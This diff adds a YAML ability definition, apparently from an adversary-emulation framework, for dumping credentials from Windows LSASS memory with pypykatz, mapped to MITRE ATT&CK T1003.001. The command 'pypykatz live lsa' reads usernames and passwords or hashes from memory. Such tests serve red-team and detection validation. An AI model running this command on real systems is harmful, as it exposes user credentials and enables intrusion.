@@ -1,0 +1,24 @@
+- description: 'Parses secrets hidden in the LSASS process with python. Similar to
+    mimikatz''s sekurlsa::
+
+
+    Python 3 must be installed, use the get_prereq_command''s to meet the prerequisites
+    for this test.
+
+
+    Successful execution of this test will display multiple useranames and passwords/hashes
+    to the screen.
+
+    '
+  id: 03526668cc55b6544244b107feadaf22
+  name: LSASS read with pypykatz
+  platforms:
+    windows:
+      cmd:
+        cleanup: ''
+        command: pypykatz live lsa
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory'
